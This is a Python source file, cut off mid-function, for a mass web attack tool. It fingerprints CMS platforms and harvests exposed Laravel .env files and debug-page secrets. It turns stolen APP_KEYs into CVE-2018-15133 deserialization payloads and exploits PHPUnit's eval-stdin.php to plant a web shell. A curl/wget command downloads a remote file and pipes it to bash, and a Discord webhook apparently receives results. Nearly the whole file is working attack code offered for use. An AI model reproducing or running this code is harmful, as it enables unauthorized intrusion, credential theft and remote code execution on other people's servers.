#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import argparse
import base64
import hashlib
import hmac
import json
import logging
import multiprocessing
import os
import re
import socket
import sys
import traceback
import warnings
from itertools import islice
from multiprocessing.dummy import Pool as ThreadPool
from urllib.parse import urlparse
import numpy as np
import requests
import urllib3
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from discord_webhook import DiscordWebhook, DiscordEmbed
from urllib3.exceptions import InsecureRequestWarning
import random
import psycopg2
from socket import AddressFamily
from socket import SocketKind
import uuid

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
warnings.simplefilter('ignore', InsecureRequestWarning)
DEBUG = False
FORCE_SCAN = False
DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1150982402341077022/udoAb1QvO77fQxkVAW9fGN_9BITZyueieGqqFhaRKl_UnSxxDxUyT5OjljF8nXL0HpL0'
DISCORD = None
TIME_OUT = 20
SHELL_CODE = 'https://raw.githubusercontent.com/priv8-app/php/main/up.php'
SHELL_NAME = 'up.php'
EXTRA_PATH = []
EXTRA_COMMAND = 'curl -sk https://raw.githubusercontent.com/priv8-app/php/main/up.php | bash;wget --no-check-certificate --auth-no-challenge --no-cache -q -O - https://raw.githubusercontent.com/priv8-app/php/main/up.php | bash'
PATH_ROOT = os.path.dirname(os.path.realpath(__file__))
PATH_RESULT = os.path.join(PATH_ROOT, 'results')
PATH_CMS = os.path.join(PATH_ROOT, 'cms')
FILE_RESULT = os.path.join(PATH_ROOT, 'result.txt')
ATTACK = []
CMS_LIST = {
    'Wordpress': '(wp-content\/(themes|plugins|mu\-plugins)\/[^\n\s]+\.(js|css)|name\=\"generator\"\scontent\=\"WordPress|\/xmlrpc\.php)',
    'Joomla': '(var\sJoomla|name\=\"generator[^\n]+Joomla!|\/com\_[a-z0-9]+\/)',
    'Drupal': '(\/sites\/default\/files|extend\(Drupal|node_link_text|name\=\"generator[^\n><]+(Drupal\s([^\s,]+)))',
    'MediaWiki': '(name\=\"generator[^\n]+MediaWiki|mediawiki\.(user|hidpi|searchSuggest)|Powered\sby\sMediaWiki|mw\.user\.tokens)',
    'PrestaShop': '(modules?\/(tmsearch|topbanner|gsnippetsreviews)\/(search|FrontAjaxTopbanner|views)|comparedProductsIds\=\[\]|var\scomparator_max_item|name\=\"generator\"[^\n]+PrestaShop|license@prestashop\.com|@copyright[^\n]+PrestaShop|var\sprestashop_version)',
    'ZenCart': '(name\=\"generator[^\n]+(Zen\sCart|The\sZen\sCart|zen\-cart\.com\seCommerce)|products\_id\=[^=]+zenid|zencart\/|main_page=[^=]+cPath\=\d)',
    'vBulletin': '(name\=\"generator[^\n]+vBulletin|[^\n]\"vbulletinlink|vb_login_[^\s]+|vbulletin\-core)',
    'Discuz': '(name\=\"generator[^\n]+Discuz|discuz_uid|discuz_tips)',
    'Magento': '(Mage\.Cookies\.)',
    'Invision': '(<([^<]+)?(Invision\sPower)([^>]+)?>|ipb\_[^\n\'=\s]+)',
    'OpenCart': '(name\=\"generator[^\n]+OpenCart|index\.php\?route=(common|checkout|account)|catalog\/view\/theme\/[^\s\n]+\.(js|css|png|jpg))',
    'phpBB': '(name\=\"generator[^\n]+phpbb|Powered\sby[^\n]+(phpBB|phpbb\.com)|viewtopic\.php\?f=\d+)',
    'Whmcs': '(templates\/.*(pwreset|dologin|submitticket|knowledgebase)\.php)',
    'Moodle': '(\^moodle-/|moodle-[a-z0-9_-]+)',
    'YetAnotherForum': '(\syaf\.controls\.SmartScroller|\syaf_[a-z0-9_-]+)',
    'Jive': '(jive([^a-z]+)(app|Onboarding|nitro|rest|rte|ext))',
    'Lithium': '(LITHIUM\.(DEBUG|Loader|Auth|Components|Css|useCheckOnline|RenderedScripts))',
    'Esportsify': 'esportsify\.com/([^.]+).(js|css)',
    'FluxBB': '(<p[^\n]+FluxBB)',
    'osCommerce': '(oscsid\=[^"]+)',
    'Ning': '(([a-z0-9-]+)\.ning\.com|ning\.(loader)|ning\._)',
    'Zimbra': '(\=new\sZmSkin\(\)|iconURL\:\"\/img\/logo\/ImgZimbraIcon)',
}
WEBMIN_PORT_LIST = [
    "10000"
]
PSQL_PORT_LIST = [
    "5432",
    "5433"
]
CVES = {
    "CVE-2018-15133": {
        "name": "CVE-2018-15133",
        "payloads": {
            "Faker": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjEzOiJ+RVZJTF9NRVRIT0R+Ijt9fXM6ODoiACoAZXZlbnQiO3M6MTA6In5FVklMX0NNRH4iO30=",
            "PendingBroadcast": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086Mjg6IklsbHVtaW5hdGVcRXZlbnRzXERpc3BhdGNoZXIiOjE6e3M6MTI6IgAqAGxpc3RlbmVycyI7YToxOntzOjEwOiJ+RVZJTF9DTUR+IjthOjE6e2k6MDtzOjEzOiJ+RVZJTF9NRVRIT0R+Ijt9fX1zOjg6IgAqAGV2ZW50IjtzOjEwOiJ+RVZJTF9DTUR+Ijt9",
            "Notifications": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6MTA6In5FVklMX0NNRH4iO3M6MTc6IgAqAGRlZmF1bHRDaGFubmVsIjtzOjE6IngiO3M6MTc6IgAqAGN1c3RvbUNyZWF0b3JzIjthOjE6e3M6MToieCI7czoxMzoifkVWSUxfTUVUSE9EfiI7fX19",
            "Validation": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MzE6IklsbHVtaW5hdGVcVmFsaWRhdGlvblxWYWxpZGF0b3IiOjE6e3M6MTA6ImV4dGVuc2lvbnMiO2E6MTp7czowOiIiO3M6MTM6In5FVklMX01FVEhPRH4iO319czo4OiIAKgBldmVudCI7czoxMDoifkVWSUxfQ01EfiI7fQ==",
        },
        "payload_method": "system",
        "payload_command": "echo VULN_START && uname -a && echo VULN_END",
    }
}


def random_ua():
    USER_AGENT_PARTS = {
        'os': {
            'linux': {
                'name': ['Linux x86_64', 'Linux i386'],
                'ext': ['X11']
            },
            'windows': {
                'name': ['Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2'],
                'ext': ['WOW64', 'Win64; x64']
            },
            'mac': {
                'name': ['Macintosh'],
                'ext': ['Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5))
                        for
                        i in range(1, 10)]
            },
        },
        'platform': {
            'webkit': {
                'name': ['AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30)],
                'details': ['KHTML, like Gecko'],
                'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (
                    random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537),
                    random.randint(1, 36)) for i in range(1, 30)] + ['Version/%d.%d.%d Safari/%d.%d' % (
                    random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537),
                    random.randint(1, 36)) for i in range(1, 10)]
            },
            'iexplorer': {
                'browser_info': {
                    'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'],
                    'ext_pre': ['compatible', 'Windows; U'],
                    'ext_post': ['Trident/%d.0' % i for i in range(4, 6)] + [
                        '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000))
                        for
                        i in range(1, 10)]
                }
            },
            'gecko': {
                'name': ['Gecko/%d%02d%02d Firefox/%d.0' % (
                    random.randint(2001, 2010), random.randint(1, 31), random.randint(1, 12), random.randint(10, 25))
                         for i
                         in
                         range(1, 30)],
                'details': [],
                'extensions': []
            }
        }
    }
    # Mozilla/[version] ([system and browser information]) [platform] ([platform details]) [extensions]
    ## Mozilla Version
    mozilla_version = "Mozilla/5.0"  # hardcoded for now, almost every browser is on this version except IE6
    ## System And Browser Information
    # Choose random OS
    os = USER_AGENT_PARTS.get('os')[random.choice(list(USER_AGENT_PARTS.get('os').keys()))]
    os_name = random.choice(os.get('name'))
    sysinfo = os_name
    # Choose random platform
    platform = USER_AGENT_PARTS.get('platform')[random.choice(list(USER_AGENT_PARTS.get('platform').keys()))]
    # Get Browser Information if available
    if 'browser_info' in platform and platform.get('browser_info'):
        browser = platform.get('browser_info')
        browser_string = random.choice(browser.get('name'))
        if 'ext_pre' in browser:
            browser_string = "%s; %s" % (random.choice(browser.get('ext_pre')), browser_string)
        sysinfo = "%s; %s" % (browser_string, sysinfo)
        if 'ext_post' in browser:
            sysinfo = "%s; %s" % (sysinfo, random.choice(browser.get('ext_post')))
    if 'ext' in os and os.get('ext'):
        sysinfo = "%s; %s" % (sysinfo, random.choice(os.get('ext')))
    ua_string = "%s (%s)" % (mozilla_version, sysinfo)
    if 'name' in platform and platform.get('name'):
        ua_string = "%s %s" % (ua_string, random.choice(platform.get('name')))
    if 'details' in platform and platform.get('details'):
        ua_string = "%s (%s)" % (
            ua_string,
            random.choice(platform.get('details')) if len(platform.get('details')) > 1 else platform.get(
                'details').pop())
    if 'extensions' in platform and platform.get('extensions'):
        ua_string = "%s %s" % (ua_string, random.choice(platform.get('extensions')))
    return ua_string


def clean(v):
    return re.sub(r"\s#[^\n]+", "", v)


def convert_tuple(lst):
    res_dct = {lst[i]: lst[i + 1] for i in range(0, len(lst), 2)}
    return res_dct


def make_safe_filename(s):
    def safe_char(c):
        if c.isalnum():
            return c
        else:
            return "_"

    return "".join(safe_char(c) for c in s).rstrip("_")


def make_csrf_payload(app_api_key, payload):
    try:
        key_dec = base64.b64decode(app_api_key)
        iv = get_random_bytes(16)
        cipher = AES.new(key_dec, AES.MODE_CBC, iv)
        value_dec = base64.b64decode(payload)
        value_enc = cipher.encrypt(pad(value_dec, AES.block_size))
        value_enc = base64.b64encode(value_enc)
        iv_enc = base64.b64encode(iv)
        value_to_mac = iv_enc + value_enc
        mac = hmac.new(key_dec, value_to_mac, hashlib.sha256).hexdigest()
        final = {
            "iv": iv_enc.decode('utf-8'),
            "value": value_enc.decode('utf-8'),
            "mac": mac,
        }
        json_to = json.dumps(final)
        encoded = base64.b64encode(json_to.encode('ascii'))
        return encoded.decode()
    except (Exception) as error:
        print(str(error))
    return None


def check_url(url, def_header):
    result = {'ready': None, 'cms': 'Unknown', 'message': 'Unknown', 'content': ''}
    try:
        if DEBUG:
            print(style.RESET('[CHECK URL] %s\n' % url), end='')
        http = requests.session()
        req = http.get(url, timeout=TIME_OUT, verify=False, allow_redirects=True, headers=def_header)
        raw = req.content.decode(encoding='utf-8', errors='ignore')
        result.update(content=str(raw), ready=True)
        if not os.path.exists(PATH_CMS):
            os.mkdir(PATH_CMS)
        for cms, regex in CMS_LIST.items():
            try:
                if re.search(r'%s' % regex, raw):
                    result.update(cms=cms)
                    result_file = os.path.join(PATH_CMS, '%s.list' % cms)
                    try:
                        with open(result_file, 'a+') as a:
                            a.seek(0, os.SEEK_END)
                            a.write('%s\n' % url)
                            a.close()
                    except Exception as ex:
                        print(''.join(traceback.format_exception(etype=type(ex), value=ex, tb=ex.__traceback__)))
                        pass
                    break
                else:
                    if http.cookies.get('laravel_session', domain=urlparse(url).netloc):
                        result.update(cms='Laravel')
                        result_file = os.path.join(PATH_CMS, '%s.list' % 'Laravel')
                        try:
                            with open(result_file, 'a+') as a:
                                a.seek(0, os.SEEK_END)
                                a.write('%s\n' % url)
                                a.close()
                        except Exception as ex:
                            print(''.join(traceback.format_exception(etype=type(ex), value=ex, tb=ex.__traceback__)))
                            pass
                        break
                    elif http.cookies.get('ZM_LOGIN_CSRF'):
                        result.update(cms='Zimbra')
                        result_file = os.path.join(PATH_CMS, '%s.list' % 'Zimbra')
                        try:
                            with open(result_file, 'a+') as a:
                                a.seek(0, os.SEEK_END)
                                a.write('%s\n' % url)
                                a.close()
                        except Exception as ex:
                            print(''.join(traceback.format_exception(etype=type(ex), value=ex, tb=ex.__traceback__)))
                            pass
                        break
                    elif http.cookies.get('ci_session'):
                        result.update(cms='Codeigniter')
                        result_file = os.path.join(PATH_CMS, '%s.list' % 'Codeigniter')
                        try:
                            with open(result_file, 'a+') as a:
                                a.seek(0, os.SEEK_END)
                                a.write('%s\n' % url)
                                a.close()
                        except Exception as ex:
                            print(''.join(traceback.format_exception(etype=type(ex), value=ex, tb=ex.__traceback__)))
                            pass
                        break
                    else:
                        continue
            except Exception as ex:
                print(''.join(traceback.format_exception(etype=type(ex), value=ex, tb=ex.__traceback__)))
                pass
        match = re.search(r"<\s?title\s?>([^\n<>]+)<\/\s?title\s?>", raw)
        if match:
            result.update(message=str(match.group(1)), ready=True)
        else:
            result.update(message=req.reason, ready=True)
    except (
            requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout, requests.exceptions.Timeout,
            requests.exceptions.SSLError, requests.exceptions.ConnectionError, AttributeError,
            ConnectionRefusedError, socket.timeout, urllib3.exceptions.ReadTimeoutError,
            urllib3.exceptions.DecodeError, requests.exceptions.ContentDecodingError,
            requests.exceptions.TooManyRedirects):
        result.update(message="Can't connect or Timeout", ready=False)
    except KeyboardInterrupt:
        raise KeyboardInterrupt
    except Exception as error:
        logging.exception(
            ''.join(traceback.format_exception(etype=type(error), value=error, tb=error.__traceback__)))
        pass
    finally:
        if result.get('ready') and result.get('cms') == 'Unknown':
            result_file = os.path.join(PATH_CMS, 'Unknown.list')
            try:
                with open(result_file, 'a+') as a:
                    a.seek(0, os.SEEK_END)
                    a.write('%s\n' % url)
                    a.close()
            except:
                pass
        if result.get('ready') and re.search(r"^Index\sof\s\/", result.get("message")):
            result_index_of = os.path.join(PATH_ROOT, 'index_of.list')
            try:
                with open(result_index_of, 'a+') as a:
                    a.seek(0, os.SEEK_END)
                    a.write('%s\n' % url)
                    a.close()
            except:
                pass
        return result


def check_psql(url):
    result = {'ready': None, 'cms': 'Unknown', 'message': 'Unknown', 'content': ''}
    parsed = url.split(':')
    target_ip = parsed[0]
    target_port = parsed[1]
    try:
        if DEBUG:
            print(style.RESET('[CHECK PSQL] %s\n' % url), end='')
        if not os.path.exists(PATH_CMS):
            os.mkdir(PATH_CMS)
        soc = socket.socket(AddressFamily.AF_INET, SocketKind.SOCK_STREAM)
        soc.settimeout(float(TIME_OUT))
        conn = soc.connect_ex((target_ip, int(target_port)))
        if conn == 0:
            result.update(message='OK', ready=True, cms='PostgreSQL DB')
            result_file = os.path.join(PATH_CMS, '%s.list' % 'PostgreSQL')
            try:
                with open(result_file, 'a+') as a:
                    a.seek(0, os.SEEK_END)
                    a.write('%s\n' % url)
                    a.close()
            except Exception as ex:
                print(''.join(traceback.format_exception(etype=type(ex), value=ex, tb=ex.__traceback__)))
                pass
        else:
            result.update(message="Can't connect or Timeout", ready=False)
        soc.close()
    except socket.timeout:
        result.update(message="Can't connect or Timeout", ready=False)
    except KeyboardInterrupt:
        raise KeyboardInterrupt
    except Exception as error:
        logging.exception(''.join(traceback.format_exception(etype=type(error), value=error, tb=error.__traceback__)))
        pass
    finally:
        return result


def scan_env(url, def_header, force=False):
    result_env = {'vuln': None, 'message': 'Unknown', 'content': None}
    if not os.path.exists(PATH_RESULT):
        os.mkdir(PATH_RESULT)
    parsed = urlparse(url)
    if parsed.scheme:
        target = '{}://{}'.format(parsed.scheme if parsed.scheme in ['http', 'https'] else 'http', parsed.netloc)
    else:
        target = 'http://{}'.format(url)
    vuln_paths = ['.env', '.remote', '.local', '.production', 'vendor/.env', 'lib/.env', 'lab/.env', 'cronlab/.env',
              'cron/.env', 'core/.env', 'core/app/.env', 'core/Datavase/.env', 'database/.env', 'config/.env',
              'assets/.env', 'app/.env', 'apps/.env', 'uploads/.env', 'sitemaps/.env', 'saas/.env',
              'api/.env', 'psnlink/.env', 'exapi/.env', 'site/.env', 'admin/.env', 'web/.env', 'public/.env',
              'en/.env', 'tools/.env', 'v1/.env', 'v2/.env', 'administrator/.env', 'laravel/.env', 'cp/.env', 'cron/.env', 'cronlab/.env', 'cryo_project/.env', 'css/.env', 'custom/.env', 'd/.env',
'data/.env', 'deploy/.env', 'dev/.env', 'developer/.env', 'developerslv/.env', 'development/.env',
'directories/.env', 'dist/.env', 'en/.env', 'engine/.env', 'env/.env', 'fhir-api/.env', 'files/.env',
'fileserver/.env', 'html/.env', 'http/.env', 'httpboot/.env', 'tmp/.env', 'tools/.env', 'Travel_form/.env',
'ts/prime/.env', 'twitter/.env', 'ubuntu/.env', 'ui/.env', 'upfiles/.env', 'upload/.env', 'uploads/.env',
'urlmem-app/.env', 'User_info/.env', 'usr/share/nginx/html/.env', 'var/backup/.env',
'vendor/.env', 'websocket/.env', 'webstatic/.env', 'phpinfo']
    RHOST = urlparse(target).netloc
    FILE_RESULT_ENV = os.path.join(PATH_RESULT, '%s.txt' % RHOST.strip())
    already = os.path.isfile(FILE_RESULT_ENV)
    if bool(already):
        result_env.update(vuln=False if force else True, content=FILE_RESULT_ENV)
        with open(FILE_RESULT_ENV, 'r') as fc:
            for line in fc:
                if line:
                    result_env.update(message=line)
                    break
        fc.close()
    if not already or force:
        try:
            http = requests.session()
            for vuln_path in vuln_paths:
                try:
                    url_bug = '/'.join([target, vuln_path])
                    resp = http.get(url_bug, timeout=5, verify=False, allow_redirects=True,
                                    headers=def_header)
                    raw = resp.text
                    result_env.update(content=raw)
                    raw_vuln = re.compile(r"([A-Z]+_[A-Z]+\s?=[^\n]+)").search(raw)
                    vuln_env = not re.search(r"(\?>|<[^\n]+>)", raw, re.MULTILINE) and raw_vuln
                    if vuln_env and resp.status_code < 404:
                        if DEBUG:
                            print('%s\n' % raw, end='')
                        message = raw_vuln.group(1).strip()
                        result_env.update(message=message, vuln=True)
                        with open(FILE_RESULT_ENV, 'a+') as w:
                            w.write(resp.text)
                            w.close()
                        with open(FILE_RESULT, 'a+') as a:
                            a.seek(0, os.SEEK_END)
                            a.write('\n===============================%s===============================\n' % RHOST)
                            a.write(raw)
                            a.close()
                    else:
                        message = '%d : %s' % (resp.status_code, resp.reason)
                        result_env.update(message=message, content=None)
                except KeyboardInterrupt:
                    raise KeyboardInterrupt
                except:
                    pass
                finally:
                    if result_env.get('vuln'):
                        result_env.update(content=FILE_RESULT_ENV)
                        break
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as error:
            logging.exception(
                ''.join(traceback.format_exception(etype=type(error), value=error, tb=error.__traceback__)))
            pass
    return result_env


def scan_env_app_key(url, def_header):
    result_env = {'vuln': None, 'message': 'Unknown', 'content': None}
    if not os.path.exists(PATH_RESULT):
        os.mkdir(PATH_RESULT)
    parsed = urlparse(url)
    if parsed.scheme:
        target = '{}://{}'.format(parsed.scheme if parsed.scheme in ['http', 'https'] else 'http', parsed.netloc)
    else:
        target = 'http://{}'.format(url)
    RHOST = urlparse(target).netloc
    FILE_RESULT_ENV_APP_KEY = os.path.join(PATH_ROOT, 'result-envappkey.txt')
    FILE_FAIL_ENV_APP_KEY = os.path.join(PATH_ROOT, 'fail-envappkey.txt')
    FILE_RESULT_ENV = os.path.join(PATH_RESULT, '%s.txt' % RHOST.strip())
    if os.path.isfile(FILE_RESULT_ENV):
        try:
            app_api_key = None
            with open(FILE_RESULT_ENV, 'r') as fp:
                match = re.search("^APP_KEY=([^\n]+)", fp.read(), re.MULTILINE)
                if match:
                    app_api_key = match.group(1).split(':')[-1]
            if app_api_key:
                # list payload
                cve = CVES.get('CVE-2018-15133')
                # loop payload
                http = requests.session()
                for type, payload in cve.get('payloads').items():
                    payload_dec = base64.b64decode(payload).decode()
                    payload_dec = payload_dec.replace('s:13:"~EVIL_METHOD~"',
                                                      's:{}:"{}"'.format(len(cve.get('payload_method').strip()),
                                                                         cve.get('payload_method').strip()))
                    payload = payload_dec.replace('s:10:"~EVIL_CMD~"',
                                                  's:{}:"{}"'.format(len(cve.get('payload_command').strip()),
                                                                     cve.get('payload_command').strip()))
                    payload_extra = payload_dec.replace('s:10:"~EVIL_CMD~"',
                                                        's:{}:"{}"'.format(len(EXTRA_COMMAND.strip()),
                                                                           EXTRA_COMMAND.strip()))
                    encoded = base64.b64encode(str.encode(payload.strip())).decode()
                    encoded_extra = base64.b64encode(str.encode(payload_extra.strip())).decode()
                    generated_payload = make_csrf_payload(app_api_key, encoded)
                    generated_payload_extra = make_csrf_payload(app_api_key, encoded_extra)
                    try:
                        http.cookies.set('X-XSRF-TOKEN', generated_payload)
                        if DEBUG:
                            print('[Exploiting] %s\n' % target, end='')
                        res_cek = http.get(target, timeout=5, verify=False, allow_redirects=False, headers=def_header)
                        raw_cek = res_cek.content.decode(encoding='utf-8', errors='ignore')
                        rce_vuln = 'VULN_START' in raw_cek
                        if rce_vuln:
                            match = re.search("VULN_START\n(.*)\n?VULN_END", raw_cek, re.DOTALL | re.MULTILINE)
                            if match:
                                result_env.update(vuln=True, message=match.group(1).strip())
                            else:
                                result_env.update(vuln=True, message=res_cek.reason)
                            try:
                                http.cookies.set('X-XSRF-TOKEN', generated_payload_extra)
                                extra_check = http.get(target, timeout=TIME_OUT, verify=False, allow_redirects=False,
                                                       headers=def_header)
                                extra_raw = extra_check.content.decode(encoding='utf-8', errors='ignore')
                                with open(FILE_RESULT_ENV_APP_KEY, 'a+') as a:
                                    a.write('%s\n' % '#'.join([target, app_api_key]))
                                    a.close()
                            except:
                                with open(FILE_FAIL_ENV_APP_KEY, 'a+') as x:
                                    x.write('%s\n' % '#'.join([target, app_api_key]))
                                    x.close()
                                pass
                        else:
                            result_env.update(message=res_cek.reason, ready=True)
                    except KeyboardInterrupt:
                        raise KeyboardInterrupt
                    except:
                        pass
                    finally:
                        if result_env.get('vuln'):
                            break
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as error:
            logging.exception(
                ''.join(traceback.format_exception(etype=type(error), value=error, tb=error.__traceback__)))
            pass
    return result_env


def scan_env_laravel_debug(url, def_header):
    result_env = {'vuln': None, 'message': 'Unknown', 'content': None}
    if not os.path.exists(PATH_RESULT):
        os.mkdir(PATH_RESULT)
    parsed = urlparse(url)
    if parsed.scheme:
        target = '{}://{}'.format(parsed.scheme if parsed.scheme in ['http', 'https'] else 'http', parsed.netloc)
    else:
        target = 'http://{}'.format(url)
    RHOST = urlparse(target).netloc
    FILE_RESULT_ENV = os.path.join(PATH_RESULT, '%s-debug.txt' % RHOST.strip())
    try:
        http = requests.session()
        if DEBUG:
            print('[Exploiting] %s\n' % target, end='')
        payload = {'need_fuck': 'yes'}
        res_cek = http.post(target, timeout=5, verify=False, allow_redirects=False, headers=def_header, data=payload)
        raw_cek = res_cek.content.decode(encoding='utf-8', errors='ignore')
        rce_vuln = 'sf-dump-str' in raw_cek
        if rce_vuln:
            r = re.compile(
                '<td>(?P<key>[A-Z_]+)</td>[^>]+<td><pre class=sf-dump[^\n]+>\"?<span class=sf-dump[^\n]+>(?P<val>[^\n]+)</span>')
            envs = [m.groupdict() for m in r.finditer(raw_cek)]
            if len(envs):
                env_raw = ''
                for env in envs:
                    env_raw += str('%s\n' % '='.join([env.get('key'), env.get('val')]).strip())
                    if not result_env.get('vuln'):
                        result_env.update(vuln=True, message='='.join([env.get('key'), env.get('val')]).strip(), content=FILE_RESULT_ENV)
                with open(FILE_RESULT_ENV, 'w+') as x:
                    x.write(env_raw)
                    x.close()
                with open(FILE_RESULT, 'a+') as a:
                    a.seek(0, os.SEEK_END)
                    a.write('\n===============================%s===============================\n' % RHOST)
                    a.write(env_raw)
                    a.close()
    except KeyboardInterrupt:
        raise KeyboardInterrupt
    except Exception as error:
        logging.exception(
            ''.join(traceback.format_exception(etype=type(error), value=error, tb=error.__traceback__)))
        pass
    return result_env


def scan_phpunit(url, def_header, extra_path=[]):
    result_phpunit = {'vuln': None, 'message': 'Unknown', 'url': None}
    payloads = {
        'test': '<?php  echo \'RCE_VULN|\'; echo php_uname();?>',
        'default': '<?php  @system(sprintf(\'wget -O %s {{shell}}  '
                   '--no-check-certificate\', join(DIRECTORY_SEPARATOR,array(__DIR__,'
                   '\'{{shellname}}\'))));echo file_exists(join(DIRECTORY_SEPARATOR,array(__DIR__,'
                   '\'{{shellname}}\')))?\'RCE_VULN\' : \'FAILED\';?>',
        'laravel': '<?php   @system(sprintf(\'wget -O %s {{shell}} '
                   '--no-check-certificate\', is_writable(__DIR__) ? \'{{shellname}}\' : join('
                   'DIRECTORY_SEPARATOR,array(preg_replace(\'%vendor\/[^\n]+%\', '
                   '\'storage/framework/\',__DIR__),\'{{shellname}}\'))));echo file_exists(is_writable('
                   '__DIR__) ? \'{{shellname}}\' : join(DIRECTORY_SEPARATOR,array(preg_replace('
                   '\'%vendor\/[^\n]+%\', \'storage/framework/\',__DIR__),'
                   '\'{{shellname}}\')))?\'RCE_VULN\' : \'FAILED\';?>',
        'drupal': '<?php   @system(sprintf(\'wget -O %s {{shell}} '
                  '--no-check-certificate\', is_writable(__DIR__) ? \'{{shellname}}\' : join('
                  'DIRECTORY_SEPARATOR,array(preg_replace(\'%\/sites/all/[^\n]+%\',\'/sites/default/files/\','
                  '__DIR__),\'{{shellname}}\'))));echo file_exists(is_writable('
                  '__DIR__) ? \'{{shellname}}\' : join(DIRECTORY_SEPARATOR,array(preg_replace('
                  '\'%\/sites/all/[^\n]+%\', \'/sites/default/files/\',__DIR__),'
                  '\'{{shellname}}\')))?\'RCE_VULN\' : \'FAILED\';?>',
    }
    vuln_paths = [
        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php",
        "/vendor/phpunit/src/Util/PHP/eval-stdin.php",
        "/vendor/phpunit/Util/PHP/eval-stdin.php",
        "/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/phpunit/phpunit/Util/PHP/eval-stdin.php",
        "/phpunit/src/Util/PHP/eval-stdin.php",
        "/phpunit/Util/PHP/eval-stdin.php",
        "/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/lib/phpunit/phpunit/Util/PHP/eval-stdin.php",
        "/lib/phpunit/src/Util/PHP/eval-stdin.php",
        "/lib/phpunit/Util/PHP/eval-stdin.php",
        "/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    ]
    if not os.path.exists(PATH_RESULT):
        os.mkdir(PATH_RESULT)
    parsed = urlparse(url)
    if parsed.scheme:
        target = '{}://{}'.format(parsed.scheme if parsed.scheme in ['http', 'https'] else 'http', parsed.netloc)
    else:
        target = 'http://{}'.format(url)
    vuln_paths = np.unique(vuln_paths + extra_path)
    RHOST = urlparse(target).netloc
    payloads = {k: v.replace('{{shell}}', SHELL_CODE).replace('{{shellname}}', SHELL_NAME) for k, v in payloads.items()}
    payload_test = payloads.get('test')
    payload = payloads.get('default')
    FILE_RESULT_RCE = os.path.join(PATH_ROOT, 'result-rce.txt')
    FILE_FAIL_RCE = os.path.join(PATH_ROOT, 'fail-rce.txt')
    FILE_RESULT_HOST = os.path.join(PATH_RESULT, '%s.txt' % RHOST.strip())
    try:
        http = requests.session()
        for rce in vuln_paths:
            rce_bug = '/'.join([target, rce])
            extra_cmd = '<?php  @system(\"%s\");?>' % EXTRA_COMMAND
            try:
                if DEBUG:
                    print('[Exploiting] %s\n' % rce_bug, end='')
                res_cek = http.post(rce_bug, timeout=5, verify=False, allow_redirects=False,
                                    headers=def_header, data=payload_test)
                raw_cek = res_cek.content.decode(encoding='utf-8', errors='ignore')
                rce_vuln = 'RCE_VULN' in raw_cek and not re.search(r"(\?>|<[^\n]+>)", raw_cek, re.MULTILINE)
